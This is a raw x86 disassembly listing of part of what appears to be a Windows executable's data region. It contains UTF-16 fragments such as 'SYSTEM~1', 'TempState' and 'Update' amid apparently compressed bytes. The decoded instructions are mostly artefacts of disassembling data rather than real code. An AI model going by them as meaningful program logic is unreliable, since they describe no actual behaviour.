  403072:	9d                   	popf
  403073:	b7 76                	mov    $0x76,%bh
  403075:	16                   	push   %ss
  403076:	db 01                	fildl  (%ecx)
  403078:	f7 31                	divl   (%ecx)
  40307a:	1f                   	pop    %ds
  40307b:	f9                   	stc
  40307c:	d3 3c db             	sarl   %cl,(%ebx,%ebx,8)
  40307f:	01 00                	add    %eax,(%eax)
	...
  403091:	00 00                	add    %al,(%eax)
  403093:	10 00                	adc    %al,(%eax)
  403095:	00 00                	add    %al,(%eax)
  403097:	00 08                	add    %cl,(%eax)
  403099:	02 53 00             	add    0x0(%ebx),%dl
  40309c:	59                   	pop    %ecx
  40309d:	00 53 00             	add    %dl,0x0(%ebx)
  4030a0:	54                   	push   %esp
  4030a1:	00 45 00             	add    %al,0x0(%ebp)
  4030a4:	4d                   	dec    %ebp
  4030a5:	00 7e 00             	add    %bh,0x0(%esi)
  4030a8:	31 00                	xor    %eax,(%eax)
  4030aa:	65 00 00             	add    %al,%gs:(%eax)
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	0f 01                	(bad)
  4030b8:	68 00 54 00 00       	push   $0x5400
  4030bd:	00 00                	add    %al,(%eax)
  4030bf:	00 09                	add    %cl,(%ecx)
  4030c1:	2a 00                	sub    (%eax),%al
  4030c3:	00 00                	add    %al,(%eax)
  4030c5:	00 61 00             	add    %ah,0x0(%ecx)
  4030c8:	c2 10 61             	ret    $0x6110
  4030cb:	b7 d2                	mov    $0xd2,%bh
  4030cd:	23 da                	and    %edx,%ebx
  4030cf:	01 c2                	add    %eax,%edx
  4030d1:	10 61 b7             	adc    %ah,-0x49(%ecx)
  4030d4:	d2 23                	shlb   %cl,(%ebx)
  4030d6:	da 01                	fiaddl (%ecx)
  4030d8:	d7                   	xlat   %ds:(%ebx)
  4030d9:	37                   	aaa
  4030da:	61                   	popa
  4030db:	b7 d2                	mov    $0xd2,%bh
  4030dd:	23 da                	and    %edx,%ebx
  4030df:	01 87 08 8d 66 be    	add    %eax,-0x419972f8(%edi)
  4030e5:	4e                   	dec    %esi
  4030e6:	db 01                	fildl  (%ecx)
	...
  4030f8:	00 00                	add    %al,(%eax)
  4030fa:	00 10                	add    %dl,(%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 00                	add    %al,(%eax)
  403100:	09 01                	or     %eax,(%ecx)
  403102:	54                   	push   %esp
  403103:	00 65 00             	add    %ah,0x0(%ebp)
  403106:	6d                   	insl   (%dx),%es:(%edi)
  403107:	00 70 00             	add    %dh,0x0(%eax)
  40310a:	53                   	push   %ebx
  40310b:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40310f:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  403113:	00 00                	add    %al,(%eax)
  403115:	00 00                	add    %al,(%eax)
  403117:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40311a:	00 00                	add    %al,(%eax)
  40311c:	00 00                	add    %al,(%eax)
  40311e:	0f 01                	(bad)
  403120:	68 00 52 00 00       	push   $0x5200
  403125:	00 00                	add    %al,(%eax)
  403127:	00 09                	add    %cl,(%ecx)
  403129:	2a 00                	sub    (%eax),%al
  40312b:	00 00                	add    %al,(%eax)
  40312d:	00 61 00             	add    %ah,0x0(%ecx)
  403130:	c2 10 61             	ret    $0x6110
  403133:	b7 d2                	mov    $0xd2,%bh
  403135:	23 da                	and    %edx,%ebx
  403137:	01 c2                	add    %eax,%edx
  403139:	10 61 b7             	adc    %ah,-0x49(%ecx)
  40313c:	d2 23                	shlb   %cl,(%ebx)
  40313e:	da 01                	fiaddl (%ecx)
  403140:	d7                   	xlat   %ds:(%ebx)
  403141:	37                   	aaa
  403142:	61                   	popa
  403143:	b7 d2                	mov    $0xd2,%bh
  403145:	23 da                	and    %edx,%ebx
  403147:	01 87 08 8d 66 be    	add    %eax,-0x419972f8(%edi)
  40314d:	4e                   	dec    %esi
  40314e:	db 01                	fildl  (%ecx)
	...
  403160:	00 00                	add    %al,(%eax)
  403162:	00 10                	add    %dl,(%eax)
  403164:	00 00                	add    %al,(%eax)
  403166:	00 00                	add    %al,(%eax)
  403168:	08 02                	or     %al,(%edx)
  40316a:	54                   	push   %esp
  40316b:	00 45 00             	add    %al,0x0(%ebp)
  40316e:	4d                   	dec    %ebp
  40316f:	00 50 00             	add    %dl,0x0(%eax)
  403172:	53                   	push   %ebx
  403173:	00 54 00 7e          	add    %dl,0x7e(%eax,%eax,1)
  403177:	00 31                	add    %dh,(%ecx)
	...
  403185:	00 00                	add    %al,(%eax)
  403187:	00 10                	add    %dl,(%eax)
  403189:	00 00                	add    %al,(%eax)
  40318b:	00 02                	add    %al,(%edx)
	...
  4031fd:	00 d8                	add    %bl,%al
	...
  4033fb:	00 00                	add    %al,(%eax)
  4033fd:	00 d8                	add    %bl,%al
	...
  4035fb:	00 00                	add    %al,(%eax)
  4035fd:	00 d8                	add    %bl,%al
	...
  4037fb:	00 00                	add    %al,(%eax)
  4037fd:	00 d8                	add    %bl,%al
	...
  4039fb:	00 00                	add    %al,(%eax)
  4039fd:	00 d8                	add    %bl,%al
	...
  403bfb:	00 00                	add    %al,(%eax)
  403bfd:	00 d8                	add    %bl,%al
  403bff:	00 36                	add    %dh,(%esi)
  403c01:	b5 80                	mov    $0x80,%ch
  403c03:	30 00                	xor    %al,(%eax)
  403c05:	37                   	aaa
  403c06:	00 2f                	add    %ch,(%edi)
  403c08:	00 32                	add    %dh,(%edx)
  403c0a:	00 10                	add    %dl,(%eax)
  403c0c:	05 01 50 30 00       	add    $0x305001,%eax
  403c11:	70 34                	jo     0x403c47
  403c13:	00 20                	add    %ah,(%eax)
  403c15:	00 31                	add    %dh,(%ecx)
  403c17:	01 00                	add    %eax,(%eax)
  403c19:	a8 3a                	test   $0x3a,%al
  403c1b:	00 30                	add    %dh,(%eax)
  403c1d:	00 33                	add    %dh,(%ebx)
  403c1f:	00 3a                	add    %bh,(%edx)
  403c21:	41                   	inc    %ecx
  403c22:	00 2c 32             	add    %ch,(%edx,%esi,1)
  403c25:	00 2e                	add    %ch,(%esi)
  403c27:	00 34 00             	add    %dh,(%eax,%eax,1)
  403c2a:	64 30 01             	xor    %al,%fs:(%ecx)
  403c2d:	00 64 55 00          	add    %ah,0x0(%ebp,%edx,2)
  403c31:	70 00                	jo     0x403c33
  403c33:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403c37:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  403c3b:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  403c3f:	40                   	inc    %eax
  403c40:	00 77 00             	add    %dh,0x0(%edi)
  403c43:	6e                   	outsb  %ds:(%esi),(%dx)
  403c44:	00 6c 00 0e          	add    %ch,0xe(%eax,%eax,1)
  403c48:	61                   	popa
  403c49:	11 00                	adc    %eax,(%eax)
  403c4b:	2a 65 00             	sub    0x0(%ebp),%ah
  403c4e:	72 00                	jb     0x403c50
  403c50:	5e                   	pop    %esi
  403c51:	20 00                	and    %al,(%eax)
  403c53:	49                   	dec    %ecx
  403c54:	15 00 26 69 00       	adc    $0x692600,%eax
  403c59:	42                   	inc    %edx
  403c5a:	69 00 4e 6c 00 69    	imul   $0x69006c4e,(%eax),%eax
  403c60:	04 00                	add    $0x0,%al
  403c62:	7a 00                	jp     0x403c64
  403c64:	56                   	push   %esi
  403c65:	28 00                	sub    %al,(%eax)
  403c67:	29 00                	sub    %eax,(%eax)
  403c69:	0d ac 00 0a 00       	or     $0xa00ac,%eax
  403c6e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403c6f:	4f                   	dec    %edi
  403c70:	de 4c 04 7f          	fimuls 0x7f(%esp,%eax,1)
  403c74:	69 00 77 aa 67 00    	imul   $0x67aa77,(%eax),%eax
  403c7a:	a3 61 00 07 64       	mov    %eax,0x64070061
  403c7f:	00 07                	add    %al,(%edi)
  403c81:	70 00                	jo     0x403c83
  403c83:	7f 48                	jg     0x403ccd
  403c85:	72 00                	jb     0x403c87
  403c87:	73 00                	jae    0x403c89
  403c89:	81 6e 00 01 17 63 b1 	subl   $0xb1631701,0x0(%esi)
  403c90:	00 0f                	add    %cl,(%edi)
  403c92:	63 00                	arpl   %eax,(%eax)
  403c94:	68 00 8d 01 1d       	push   $0x1d018d00
  403c99:	75 08                	jne    0x403ca3
  403c9b:	c9                   	leave
  403c9c:	80 20 00             	andb   $0x0,(%eax)
  403c9f:	58                   	pop    %eax
  403ca0:	00 4d 00             	add    %cl,0x0(%ebp)
  403ca3:	4c                   	dec    %esp
  403ca4:	ae                   	scas   %es:(%edi),%al
  403ca5:	50                   	push   %eax
  403ca6:	46                   	inc    %esi
  403ca7:	32 80 32 a1 88 43    	xor    0x4388a132(%eax),%al
  403cad:	00 75 80             	add    %dh,-0x80(%ebp)
  403cb0:	8d 72 c5             	lea    -0x3b(%edx),%esi
  403cb3:	80 3c 6e 80          	cmpb   $0x80,(%esi,%ebp,2)
  403cb7:	8b 20                	mov    (%eax),%esp
  403cb9:	00 76 80             	add    %dh,-0x80(%esi)
  403cbc:	04 83                	add    $0x83,%al
  403cbe:	4c                   	dec    %esp
  403cbf:	aa                   	stos   %al,%es:(%edi)
  403cc0:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc1:	80 55 20 80          	adcb   $0x80,0x20(%ebp)
  403cc5:	50                   	push   %eax
  403cc6:	73 80                	jae    0x403c48
  403cc8:	24 67                	and    $0x67,%al
  403cca:	80 11 d6             	adcb   $0xd6,(%ecx)
  403ccd:	65 80 51 81 ad       	adcb   $0xad,%gs:-0x7f(%ecx)
  403cd2:	72 80                	jb     0x403c54
  403cd4:	07                   	pop    %es
  403cd5:	74 80                	je     0x403c57
  403cd7:	55                   	push   %ebp
  403cd8:	81 65 a8 20 00 6d 80 	andl   $0x806d0020,-0x58(%ebp)
  403cdf:	0a 78 80             	or     -0x80(%eax),%bh
  403ce2:	08 61 80             	or     %ah,-0x80(%ecx)
  403ce5:	59                   	pop    %ecx
  403ce6:	52                   	push   %edx
  403ce7:	70 80                	jo     0x403c69
  403ce9:	b7 69                	mov    $0x69,%bh
  403ceb:	00 81 65 62 80 04    	add    %al,0x4806265(%ecx)
  403cf1:	65 af                	gs scas %es:(%edi),%eax
  403cf3:	80 0a 8b             	orb    $0x8b,(%edx)
  403cf6:	26 ad                	lods   %es:(%esi),%eax
  403cf8:	b2 e5                	mov    $0xe5,%dl
  403cfa:	30 49 40             	xor    %cl,0x40(%ecx)
  403cfd:	52                   	push   %edx
  403cfe:	4d                   	dec    %ebp
  403cff:	c0 21 a3             	shlb   $0xa3,(%ecx)
  403d02:	41                   	inc    %ecx
  403d03:	50                   	push   %eax
  403d04:	41                   	inc    %ecx
  403d05:	5a                   	pop    %edx
  403d06:	65 00 54 c0 27       	add    %dl,%gs:0x27(%eax,%eax,8)
  403d0b:	72 c0                	jb     0x403ccd
  403d0d:	5e                   	pop    %esi
  403d0e:	ba 74 c0 34 6c       	mov    $0x6c34c074,%edx
  403d13:	40                   	inc    %eax
  403d14:	34 41                	xor    $0x41,%al
  403d16:	55                   	push   %ebp
  403d17:	c1 38 74             	sarl   $0x74,(%eax)
  403d1a:	42                   	inc    %edx
  403d1b:	3b aa 6e c4 5d 3a    	cmp    0x3a5dc46e(%edx),%ebp
  403d21:	40                   	inc    %eax
  403d22:	28 74 40 36          	sub    %dh,0x36(%eax,%eax,2)
  403d26:	75 40                	jne    0x403d68
  403d28:	08 56 2c             	or     %dl,0x2c(%esi)
  403d2b:	c0 02 c9             	rolb   $0xc9,(%edx)
  403d2e:	5d                   	pop    %ebp
  403d2f:	47                   	inc    %edi
  403d30:	c0 05 6f 40 0b 70 85 	rolb   $0x85,0x700b406f
  403d37:	c0 8c 64 c2 8e 36 00 	rorb   $0x35,0x368ec2(%esp,%eiz,2)
  403d3e:	35 
  403d3f:	00 4d 09             	add    %cl,0x9(%ebp)
  403d42:	db cd                	fcmovne %st(5),%st
  403d44:	19 41 14             	sbb    %eax,0x14(%ecx)
  403d47:	32 c0                	xor    %al,%al
  403d49:	09 6d 3a             	or     %ebp,0x3a(%ebp)
  403d4c:	33 40 1f             	xor    0x1f(%eax),%eax
  403d4f:	61                   	popa
  403d50:	6b a0 21 00 45 00 52 	imul   $0x52,0x450021(%eax),%esp
  403d57:	40                   	inc    %eax
  403d58:	00 4f c0             	add    %cl,-0x40(%edi)
  403d5b:	00 8a 21 c0 0c 28    	add    %cl,0x280cc021(%edx)
  403d61:	40                   	inc    %eax
  403d62:	ad                   	lods   %ds:(%esi),%eax
  403d63:	78 00                	js     0x403d65
  403d65:	38 40 01             	cmp    %al,0x1(%eax)
  403d68:	d5 c1                	aad    $0xc1
  403d6a:	c7                   	(bad)
  403d6b:	30 c2                	xor    %al,%dl
  403d6d:	01 35 c0 b3 20 40    	add    %esi,0x4020b3c0
  403d73:	8c c1                	mov    %es,%ecx
  403d75:	6b 22 76             	imul   $0x76,(%edx),%esp
  403d78:	44                   	inc    %esp
  403d79:	3a 20                	cmp    (%eax),%ah
  403d7b:	00 47 c0             	add    %al,-0x40(%edi)
  403d7e:	38 74 00 6a          	cmp    %dh,0x6a(%eax,%eax,1)
  403d82:	4e                   	dec    %esi
  403d83:	c0 44 64 40 02       	rolb   $0x2,0x40(%esp,%eiz,2)
  403d88:	41                   	inc    %ecx
  403d89:	c0 45 41 3e          	rolb   $0x3e,0x41(%ebp)
  403d8d:	69 3c 00 62 c0 38 41 	imul   $0x4138c062,(%eax,%eax,1),%edi
  403d94:	75 71                	jne    0x403e07
  403d96:	c1 65 2d 65          	shll   $0x65,0x2d(%ebp)
  403d9a:	00 aa 78 40 87 65    	add    %ch,0x65874078(%edx)
  403da0:	40                   	inc    %eax
  403da1:	54                   	push   %esp
  403da2:	69 c0 8b 65 c0 95    	imul   $0x95c0658b,%eax,%eax
  403da8:	a0 74 00 4f 00       	mov    0x4f0074,%al
  403dad:	66 40                	inc    %ax
  403daf:	00 73 42             	add    %dh,0x42(%ebx)
  403db2:	25 b5 45 99 6e       	and    $0x6e9945b5,%eax
  403db7:	42                   	inc    %edx
  403db8:	6c                   	insb   (%dx),%es:(%edi)
  403db9:	20 c0                	and    %al,%al
  403dbb:	05 41 5e 6e e0       	add    $0xe06e5e41,%eax
  403dc0:	76 bd                	jbe    0x403d7f
  403dc2:	21 03                	and    %eax,(%ebx)
  403dc4:	6e                   	outsb  %ds:(%esi),(%dx)
  403dc5:	e0 1c                	loopne 0x403de3
  403dc7:	2b 62 e1             	sub    -0x1f(%edx),%esp
  403dca:	04 a1                	add    $0xa1,%al
  403dcc:	18 2e                	sbb    %ch,(%esi)
  403dce:	20 03                	and    %al,(%ebx)
  403dd0:	82 48 20 21          	orb    $0x21,0x20(%eax)
  403dd4:	45                   	inc    %ebp
  403dd5:	00 53 00             	add    %dl,0x0(%ebx)
  403dd8:	55                   	push   %ebp
  403dd9:	20 1e                	and    %bl,(%esi)
  403ddb:	f8                   	clc
  403ddc:	54                   	push   %esp
  403ddd:	00 3d 6e 21 3f 31    	add    %bh,0x313f216e
  403de3:	2b 89 7f 1a 23 89    	sub    -0x76dce581(%ecx),%ecx
  403de9:	f5                   	cmc
  403dea:	21 29                	and    %ebp,(%ecx)
  403dec:	20 60 4e             	and    %ah,0x4e(%eax)
  403def:	70 20                	jo     0x403e11
  403df1:	1b 21                	sbb    (%ecx),%esp
  403df3:	89 a9 5e b3 15 ad    	mov    %ebp,-0x52ea4ca2(%ecx)
  403df9:	eb 1a                	jmp    0x403e15
  403dfb:	66 60                	pushaw
  403dfd:	1d 21 69 63 e0       	sbb    $0xe0636921,%eax
  403e02:	2f                   	das
  403e03:	72 20                	jb     0x403e25
  403e05:	23 bd a3 22 20 a0    	and    -0x5fdfdd5d(%ebp),%edi
  403e0b:	67 a1 09 a5          	addr16 mov 0xa509,%eax
  403e0f:	01 ff                	add    %edi,%edi
  403e11:	67 32 e0             	addr16 xor %al,%ah
  403e14:	9f                   	lahf
  403e15:	ef                   	out    %eax,(%dx)
  403e16:	b5 a2                	mov    $0xa2,%ch
  403e18:	7f 19                	jg     0x403e33
  403e1a:	63 19                	arpl   %ebx,(%ecx)
  403e1c:	b3 4a                	mov    $0x4a,%bl
  403e1e:	43                   	inc    %ebx
  403e1f:	a0 49 61 59 a1       	mov    0xa1596149,%al
  403e24:	4a                   	dec    %edx
  403e25:	aa                   	stos   %al,%es:(%edi)
  403e26:	36 e0 4e             	ss loopne 0x403e77
  403e29:	29 a0 2d 4c e0 35    	sub    %esp,0x35e04c2d(%eax)
  403e2f:	61                   	popa
  403e30:	60                   	pusha
  403e31:	84 af e5 99 a3 4a    	test   %ch,0x4aa399e5(%edi)
  403e37:	29 57 25             	sub    %edx,0x25(%edi)
  403e3a:	4c                   	dec    %esp
  403e3b:	46                   	inc    %esi
  403e3c:	e2 1b                	loop   0x403e59
  403e3e:	56                   	push   %esi
  403e3f:	e0 05                	loopne 0x403e46
  403e41:	5f                   	pop    %edi
  403e42:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403e43:	89 7f 4c             	mov    %edi,0x4c(%edi)
  403e46:	2f                   	das
  403e47:	bb 7f 18 63 18       	mov    $0x1863187f,%ebx
  403e4c:	42                   	inc    %edx
  403e4d:	22 5d 61             	and    0x61(%ebp),%bl
  403e50:	d5 20                	aad    $0x20
  403e52:	29 79 60             	sub    %edi,0x60(%ecx)
  403e55:	41                   	inc    %ecx
  403e56:	52                   	push   %edx
  403e57:	a0 41 3d e0 15       	mov    0x15e03d41,%al
  403e5c:	a9 02 d1 61 19       	test   $0x1961d102,%eax
  403e61:	36 00 48 60          	add    %cl,%ss:0x60(%eax)
  403e65:	36 73 a0             	ss jae 0x403e08
  403e68:	83 a1 03 6a 52 a0 13 	andl   $0x13,-0x5fad95fd(%ecx)
  403e6f:	73 e2                	jae    0x403e53
  403e71:	95                   	xchg   %eax,%ebp
  403e72:	6e                   	outsb  %ds:(%esi),(%dx)
  403e73:	20 86 63 53 3d dd    	and    %al,-0x22c2ac9d(%esi)
  403e79:	a0 ca 34 60 2a       	mov    0x2a6034ca,%al
  403e7e:	21 ca                	and    %ecx,%edx
  403e80:	ad                   	lods   %ds:(%esi),%eax
  403e81:	7b 3d                	jnp    0x403ec0
  403e83:	bf b0 ec d2 db       	mov    $0xdbd2ecb0,%edi
  403e88:	bf 17 3f 30 35       	mov    $0x35303f17,%edi
  403e8d:	a2 7a 35 30 50       	mov    %al,0x5030357a
  403e92:	e0 19                	loopne 0x403ead
  403e94:	21 2c 56             	and    %ebp,(%esi,%edx,2)
  403e97:	65 a0 1e e9 df 65    	mov    %gs:0x65dfe91e,%al
  403e9d:	60                   	pusha
  403e9e:	a2 63 a0 21 69       	mov    %al,0x6921a063
  403ea3:	9d                   	popf
  403ea4:	e0 53                	loopne 0x403ef9
  403ea6:	74 60                	je     0x403f08
  403ea8:	23 a1 b9 65 33 73    	and    0x733365b9(%ecx),%esp
  403eae:	00 3f                	add    %bh,(%edi)
  403eb0:	31 7d 3f             	xor    %edi,0x3f(%ebp)
  403eb3:	31 44 20 3c          	xor    %eax,0x3c(%eax,%eiz,1)
  403eb7:	71 ec                	jno    0x403ea5
  403eb9:	bf 49 75 19 a5       	mov    $0xa5197549,%edi
  403ebe:	e5 41                	in     $0x41,%eax
  403ec0:	e9 20 84 64 00       	jmp    0xa4c2e5
  403ec5:	27                   	daa
  403ec6:	1b 43 30             	sbb    0x30(%ebx),%eax
  403ec9:	0e                   	push   %cs
  403eca:	d5 71                	aad    $0x71
  403ecc:	b9 26 fa 58 d0       	mov    $0xd058fa26,%ecx
  403ed1:	44                   	inc    %esp
  403ed2:	6c                   	insb   (%dx),%es:(%edi)
  403ed3:	bf 0c 52 83 ff       	mov    $0xff83520c,%edi
  403ed8:	82 f9 82             	cmp    $0x82,%cl
  403edb:	91                   	xchg   %eax,%ecx
  403edc:	84 1f                	test   %bl,(%edi)
  403ede:	99                   	cltd
  403edf:	04 bf                	add    $0xbf,%al
  403ee1:	0c 7f                	or     $0x7f,%al
  403ee3:	19 f7                	sbb    %esi,%edi
  403ee5:	56                   	push   %esi
  403ee6:	9f                   	lahf
  403ee7:	31 20                	xor    %esp,(%eax)
  403ee9:	00 46 ad             	add    %al,-0x53(%esi)
  403eec:	30 0a                	xor    %cl,(%edx)
  403eee:	69 52 6f b1 66 74 b0 	imul   $0xb07466b1,0x6f(%edx),%edx
  403ef5:	11 20                	adc    %esp,(%eax)
  403ef7:	d0 00                	rolb   $1,(%eax)
  403ef9:	fe                   	(bad)
  403efa:	6f                   	outsl  %ds:(%esi),(%dx)
  403efb:	50                   	push   %eax
  403efc:	01 f1                	add    %esi,%ecx
  403efe:	00 7d 7f             	add    %bh,0x7f(%ebp)
  403f01:	b1 71                	mov    $0x71,%cl
  403f03:	5b                   	pop    %ebx
  403f04:	42                   	inc    %edx
  403f05:	53                   	push   %ebx
  403f06:	7e 31                	jle    0x403f39
  403f08:	42                   	inc    %edx
  403f09:	bd 53 04 20 d0       	mov    $0xd0200453,%ebp
  403f0e:	4f                   	dec    %edi
  403f0f:	91                   	xchg   %eax,%ecx
  403f10:	79 95                	jns    0x403ea7
  403f12:	36 9f                	ss lahf
  403f14:	8b 65 9f             	mov    -0x61(%ebp),%esp
  403f17:	0f bf 9f 0f b0 23 fb 	movswl -0x4dc4ff1(%edi),%ebx
  403f1e:	4d                   	dec    %ebp
  403f1f:	9f                   	lahf
  403f20:	0f 9f 92 51 6c 44 b0 	setg   -0x4fbb93af(%edx)
  403f27:	31 ef                	xor    %ebp,%edi
  403f29:	91                   	xchg   %eax,%ecx
  403f2a:	73 b1                	jae    0x403edd
  403f2c:	23 33                	and    (%ebx),%esi
  403f2e:	8a 91 08 76 f0 0c    	mov    0xcf07608(%ecx),%dl
  403f34:	f1                   	int1
  403f35:	49                   	dec    %ecx
  403f36:	31 0d f5 f9 13 2e    	xor    %ecx,0x2e13f9f5
  403f3c:	10 5e 6d             	adc    %bl,0x6d(%esi)
  403f3f:	f0 0e                	lock push %cs
  403f41:	5f                   	pop    %edi
  403f42:	0b b1 76 31 04 fe    	or     -0x1fbce8a(%ecx),%esi
  403f48:	61                   	popa
  403f49:	d0 01                	rolb   $1,(%ecx)
  403f4b:	ff 96 ff 9d ff 9d    	call   *-0x62006201(%esi)
  403f51:	f1                   	int1
  403f52:	9d                   	popf
  403f53:	5f                   	pop    %edi
  403f54:	0b 5f 0b             	or     0xb(%edi),%ebx
  403f57:	6f                   	outsl  %ds:(%esi),(%dx)
  403f58:	51                   	push   %ecx
  403f59:	0b fd                	or     %ebp,%edi
  403f5b:	49                   	dec    %ecx
  403f5c:	5f                   	pop    %edi
  403f5d:	13 5f 13             	adc    0x13(%edi),%ebx
  403f60:	32 5f 13             	xor    0x13(%edi),%bl
  403f63:	5c                   	pop    %esp
  403f64:	13 33                	adc    (%ebx),%esi
  403f66:	fd                   	std
  403f67:	50                   	push   %eax
  403f68:	65 20 fc             	gs and %bh,%ah
  403f6b:	35 ff 07 53 13       	xor    $0x135307ff,%eax
  403f70:	7b 01                	jnp    0x403f73
  403f72:	53                   	push   %ebx
  403f73:	1d f3 2c aa 43       	sbb    $0x43aa2cf3,%eax
  403f78:	50                   	push   %eax
  403f79:	47                   	inc    %edi
  403f7a:	65 d0 46 6b          	rolb   $1,%gs:0x6b(%esi)
  403f7e:	b0 22                	mov    $0x22,%al
  403f80:	6f                   	outsl  %ds:(%esi),(%dx)
  403f81:	90                   	nop
  403f82:	39 fe                	cmp    %edi,%esi
  403f84:	41                   	inc    %ecx
  403f85:	90                   	nop
  403f86:	39 1d 93 39 15 5f    	cmp    %ebx,0x5f153993
  403f8c:	3a 9f 0a 5d 3a 9f    	cmp    -0x60c5a2f6(%edi),%bl
  403f92:	0a ff                	or     %bh,%bh
  403f94:	9f                   	lahf
  403f95:	2d 93 2d df 08       	sub    $0x8df2d93,%eax
  403f9a:	9f                   	lahf
  403f9b:	6c                   	insb   (%dx),%es:(%edi)
  403f9c:	df 08                	fisttps (%eax)
  403f9e:	df 74 7f 36          	fbstp  0x36(%edi,%edi,2)
  403fa2:	77 36                	ja     0x403fda
  403fa4:	7f df                	jg     0x403f85
  403fa6:	08 df                	or     %bl,%bh
  403fa8:	08 d3                	or     %dl,%bl
  403faa:	08 7d 01             	or     %bh,0x1(%ebp)
  403fad:	55                   	push   %ebp
  403fae:	2f                   	das
  403faf:	71 a6                	jno    0x403f57
  403fb1:	b1 32                	mov    $0x32,%cl
  403fb3:	6c                   	insb   (%dx),%es:(%edi)
  403fb4:	fb                   	sti
  403fb5:	70 27                	jo     0x403fde
  403fb7:	51                   	push   %ecx
  403fb8:	8a 73 70             	mov    0x70(%ebx),%dh
  403fbb:	8b 9b 18 95 27 9f    	mov    -0x60d86ae8(%ebx),%ebx
  403fc1:	09 9f 09 c5 9d 09    	or     %ebx,0x99dc509(%edi)
  403fc7:	57                   	push   %edi
  403fc8:	30 2e                	xor    %ch,(%esi)
  403fca:	62 00                	bound  %eax,(%eax)
  403fcc:	43                   	inc    %ebx
  403fcd:	92                   	xchg   %eax,%edx
  403fce:	29 13                	sub    %edx,(%ebx)
  403fd0:	77 af                	ja     0x403f81
  403fd2:	31 1c 5f             	xor    %ebx,(%edi,%ebx,2)
  403fd5:	01 51 96             	add    %edx,-0x6a(%ecx)
  403fd8:	b3 95                	mov    $0x95,%bl
  403fda:	30 d0                	xor    %dl,%al
  403fdc:	61                   	popa
  403fdd:	37                   	aaa
  403fde:	10 03                	adc    %al,(%ebx)
  403fe0:	a2 44 30 1c 35       	mov    %al,0x351c3044
  403fe5:	00 42 d0             	add    %al,-0x30(%edx)
  403fe8:	5e                   	pop    %esi
  403fe9:	36 d0 00             	rolb   $1,%ss:(%eax)
  403fec:	16                   	push   %ss
  403fed:	30 10                	xor    %dl,(%eax)
  403fef:	97                   	xchg   %eax,%edi
  403ff0:	91                   	xchg   %eax,%ecx
  403ff1:	03 75 30             	add    0x30(%ebp),%esi
  403ff4:	57                   	push   %edi
  403ff5:	65 00 57 d5          	add    %dl,%gs:-0x2b(%edi)
  403ff9:	92                   	xchg   %eax,%edx
  403ffa:	68 48 12 96 70       	push   $0x70961248
  403fff:	92                   	xchg   %eax,%edx
  404000:	a3 66 52 33 b1       	mov    %eax,0xb1335266
  404005:	8e f7                	mov    %edi,%?
  404007:	5f                   	pop    %edi
  404008:	0a 5f 0a             	or     0xa(%edi),%bl
  40400b:	5f                   	pop    %edi
  40400c:	0a 65 50             	or     0x50(%ebp),%ah
  40400f:	9a 5f 0a 5d 01 5f 0a 	lcall  $0xa5f,$0x15d0a5f
  404016:	6b 5f 0a 51          	imul   $0x51,0xa(%edi),%ebx
  40401a:	0a 42 50             	or     0x50(%edx),%al
  40401d:	0f 67 32             	packuswb (%edx),%mm6
  404020:	0a 75 b0             	or     -0x50(%ebp),%dh
  404023:	20 d4                	and    %dl,%ah
  404025:	00 41 90             	add    %al,-0x70(%ecx)
  404028:	0b 79 50             	or     0x50(%ecx),%edi
  40402b:	57                   	push   %edi
  40402c:	63 30                	arpl   %esi,(%eax)
  40402e:	73 bd                	jae    0x403fed
  404030:	18 c5                	sbb    %al,%ch
  404032:	31 af 69 d0 48 3d    	xor    %ebp,0x3d48d069(%edi)
  404038:	00 5b 3a             	add    %bl,0x3a(%ebx)
  40403b:	30 d3                	xor    %dl,%bl
  40403d:	57                   	push   %edi
  40403e:	aa                   	stos   %al,%es:(%edi)
  40403f:	5d                   	pop    %ebp
  404040:	32 b1 68 f0 04 67    	xor    0x6704f068(%ecx),%dh
  404046:	f0 2d 50 12 67 57    	lock sub $0x57671250,%eax
  40404c:	91                   	xchg   %eax,%ecx
  40404d:	02 75 b5             	add    -0x4b(%ebp),%dh
  404050:	f3 01 55 76          	repz add %edx,0x76(%ebp)
  404054:	01 68 74             	add    %ebp,0x74(%eax)
  404057:	11 73 75             	adc    %esi,0x75(%ebx)
  40405a:	90                   	nop
  40405b:	11 2f                	adc    %ebp,(%edi)
  40405d:	90                   	nop
  40405e:	37                   	aaa
  40405f:	67 10 dc             	addr16 adc %bl,%ah
  404062:	11 45 91             	adc    %eax,-0x6f(%ebp)
  404065:	8e 2e                	mov    (%esi),%gs
  404067:	51                   	push   %ecx
  404068:	d0 31                	shlb   $1,(%ecx)
  40406a:	6f                   	outsl  %ds:(%esi),(%dx)
  40406b:	00 6d 50             	add    %ch,0x50(%ebp)
  40406e:	01 31                	add    %esi,(%ecx)
  404070:	f0 02 65 8b          	lock add -0x75(%ebp),%ah
  404074:	10 dc                	adc    %bl,%ah
  404076:	95                   	xchg   %eax,%ebp
  404077:	01 35 f0 09 6b 00    	add    %esi,0x6b09f0
  40407d:	79 50                	jns    0x4040cf
  40407f:	08 56 72             	or     %dl,0x72(%esi)
  404082:	90                   	nop
  404083:	06                   	push   %es
  404084:	b1 02                	mov    $0x2,%cl
  404086:	2f                   	das
  404087:	10 a4 6e 90 0c 44 d7 	adc    %ah,-0x28bbf370(%esi,%ebp,2)
  40408e:	92                   	xchg   %eax,%edx
  40408f:	05 11 01 b1 07       	add    $0x7b10111,%eax
  404094:	6f                   	outsl  %ds:(%esi),(%dx)
  404095:	10 02                	adc    %al,(%edx)
  404097:	75 50                	jne    0x4040e9
  404099:	04 11                	add    $0x11,%al
  40409b:	47                   	inc    %edi
  40409c:	b5 11                	mov    $0x11,%ch
  40409e:	6f                   	outsl  %ds:(%esi),(%dx)
  40409f:	56                   	push   %esi
  4040a0:	b0 e1                	mov    $0xe1,%al
  4040a2:	3f                   	aas
  4040a3:	9e                   	sahf
